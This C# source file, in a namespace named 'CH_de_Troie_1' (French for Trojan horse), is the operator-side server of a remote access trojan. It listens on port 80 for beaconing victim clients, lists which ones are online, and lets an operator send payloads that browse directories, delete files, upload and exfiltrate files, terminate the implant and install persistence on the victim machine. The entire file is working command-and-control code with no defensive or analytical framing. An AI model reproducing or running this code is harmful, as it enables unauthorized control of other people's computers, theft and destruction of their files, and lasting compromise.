using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace CH_de_Troie_1
{
    class Serveur
    {
        private const int PORT = 80;
	    private const int TIMEOUT = 10;
	    private const int OFFLINE = 30;
	    private const string NO_CLIENT_ID = "Actualiser";
	    private TcpListener tcpListener;
	    private Thread listenThread;
	    private Thread menuThread;
	    private bool connected = false;
	    private string clientID = NO_CLIENT_ID;
	    private Dictionary<string, long> clientNames = new Dictionary<string, long>();

	    private void ListenForClients() 
        {
		    this.tcpListener.Start();
		    while (true) {
			    TcpClient client = this.tcpListener.AcceptTcpClient();
			    Thread clientThread = new Thread(new ParameterizedThreadStart(HandleClientComm));
			    clientThread.Start(client);
		    }
	    }
	    private void DisplayMenu(){
		    int looper = 0;
		    while(true) 
            {
			    if(clientID != NO_CLIENT_ID && (connected || looper<TIMEOUT))
                {
				    Thread.Sleep(1000);
				    looper+=1;
				    continue;
			    }
			    if(clientID != NO_CLIENT_ID)
                {
				    Console.WriteLine("Connection failed!");
			    }
			    looper = 0;
			    List<string> names = new List<string>();
			    names.Add(NO_CLIENT_ID);
			    foreach (KeyValuePair<string, long> keyValue in clientNames)
                {
				    if(getCurrentTime() - keyValue.Value<=OFFLINE){
					    names.Add(keyValue.Key);
				    }
			    }
			    for(int i = 0;i < names.Count; i++){
				    Console.WriteLine("[" + i + "] " + names[i]);
			    }
			    this.clientID = names[int.Parse(Console.ReadLine())];
			    if(this.clientID != NO_CLIENT_ID){
				    Console.WriteLine("Connecting...");
			    }
		    }
	    }
	    private void HandleClientComm(object client) {
		    TcpClient tcpClient = (TcpClient)client;
		    NetworkStream clientStream = tcpClient.GetStream();
		    string id = getId(clientStream);
		    if(clientID != id){
			    sendPayload(clientStream, Payload.PAYLOAD_EXIT);
			    tcpClient.Close();
			    if(!clientNames.ContainsKey(id)){
				    clientNames.Add(id, getCurrentTime());
			    }else{
				    clientNames[id] = getCurrentTime();
			    }
			    return;
		    }
		    connected = true;
		    ConsoleColor current = Console.ForegroundColor;
		    while(true) {
			    try{
				    Console.Write(id + "> ");
				    Console.ForegroundColor = ConsoleColor.Yellow;
				    System.Text.RegularExpressions.Regex myRegex = new System.Text.RegularExpressions.Regex("(?<cmd>^\"[^\"]*\"|\\S*) *(?<prm>.*)?");
				    System.Text.RegularExpressions.Match m = myRegex.Match(Console.ReadLine());
				    Console.ForegroundColor = ConsoleColor.Green;
				    if(m.Success) {
					    if(m.Groups[1].Value == "cd") {
						    Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(sendPayload(clientStream, String.Format(Payload.PAYLOAD_CD, m.Groups[2].Value.Replace("\\", "\\\\")))));
					    } else if(m.Groups[1].Value == "exit" || m.Groups[1].Value == "quit") {
						    Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(sendPayload(clientStream, Payload.PAYLOAD_EXIT)));
						    Console.ForegroundColor = current;
						    break;
					    } else if(m.Groups[1].Value == "upload") {
						    System.Collections.Generic.Dictionary<string, string> parameters = getParameters(m.Groups[2].Value);
						    Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(sendPayload(clientStream, String.Format(Payload.PAYLOAD_UPLOAD, parameters["o"].Replace("\\", "\\\\"), Convert.ToBase64String(File.ReadAllBytes(parameters["i"]))))));
					    } else if(m.Groups[1].Value == "download") {
						    System.Collections.Generic.Dictionary<string, string> parameters = getParameters(m.Groups[2].Value);
						    File.WriteAllBytes(parameters["o"], sendPayload(clientStream, String.Format(Payload.PAYLOAD_DOWNLOAD, parameters["i"].Replace("\\", "\\\\"))));
						    Console.WriteLine("File " + parameters["i"] + " Downloaded to " + parameters["o"]);
					    } else if(m.Groups[1].Value == "pwd") {
						    Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(sendPayload(clientStream, Payload.PAYLOAD_PWD)));
					    } else if(m.Groups[1].Value == "rm") {
						    Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(sendPayload(clientStream, String.Format(Payload.PAYLOAD_DELETE, m.Groups[2].Value.Replace("\\", "\\\\")))));
					    } else if(m.Groups[1].Value == "ls") {
						    Console.ForegroundColor = ConsoleColor.Blue;
						    Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(sendPayload(clientStream, Payload.PAYLOAD_LIST_DIR)));
						    Console.ForegroundColor = ConsoleColor.Green;
						    Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(sendPayload(clientStream, Payload.PAYLOAD_LS)));
					    } else if(m.Groups[1].Value == "terminate") {
						    Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(sendPayload(clientStream, Payload.PAYLOAD_TERMINATE)));
						    Console.ForegroundColor = current;
						    break;
					    } else if(m.Groups[1].Value == "persist") {
						    System.Collections.Generic.Dictionary<string, string> parameters = getParameters(m.Groups[2].Value);
						    Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(sendPayload(clientStream, String.Format(Payload.PAYLOAD_PERSIST, parameters["n"]))));
					    }
				    }
			    }catch(Exception exception){
				    Console.ForegroundColor = ConsoleColor.Red;
				    Console.WriteLine(exception);
			    }
			    Console.ForegroundColor = current;
		    }
		    tcpClient.Close();
		    connected = false;
		    clientNames[id] = getCurrentTime();
		    clientID = NO_CLIENT_ID;
	    }
	    private static long getCurrentTime()
        {
		    TimeSpan _TimeSpan = (DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0));
		    return (long)_TimeSpan.TotalSeconds;
	    }
	    private static System.Collections.Generic.Dictionary<string, string> getParameters(string param) 
        {
		    System.Text.RegularExpressions.Regex myRegex = new System.Text.RegularExpressions.Regex("(?:\\s*)(?<=[-|/])(?<name>\\w*)[:|=](\"((?<value>.*?)(?<!\\\\)\")|(?<value>[\\w]*))");
		    System.Text.RegularExpressions.Match m = myRegex.Match(param);
		    System.Collections.Generic.Dictionary<string, string> result = new System.Collections.Generic.Dictionary<string, string>();
		    while(m.Success) {
			    result.Add(m.Groups[3].Value, m.Groups[4].Value);
			    m = m.NextMatch();
		    }
		    return result;
	    }
	    public static byte[] sendPayload(NetworkStream clientStream, string payload) {
		    ASCIIEncoding encoder = new ASCIIEncoding();
		    try{
			    Communication.writeString(clientStream, encoder, payload);
		    } catch(Exception exception) {
			    Console.WriteLine(exception);
		    }
		    byte[] result = new byte[0];
		    try{
			    result = Communication.read(clientStream, encoder);
		    } catch(Exception exception) {
			    Console.WriteLine(exception);
		    }
		    return result;
	    }
	    public static string getId(NetworkStream clientStream) {
		    ASCIIEncoding encoder = new ASCIIEncoding();
		    string id = Communication.readString(clientStream, encoder);
		    try{
			    Communication.writeString(clientStream, encoder, Payload.PAYLOAD_ECHO);
		    } catch(Exception exception) {
			    Console.WriteLine(exception);
		    }
		    Communication.read(clientStream, encoder);
		    return id;
	    }
        public Serveur()
        {
		    this.tcpListener = new TcpListener(IPAddress.Any, PORT);
		    this.listenThread = new Thread(new ThreadStart(ListenForClients));
		    this.listenThread.Start();
		    this.menuThread = new Thread(new ThreadStart(DisplayMenu));
		    this.menuThread.Start();
	    }
	    public static void Main(string []args) {
		    new Serveur();
	    }
    }
}
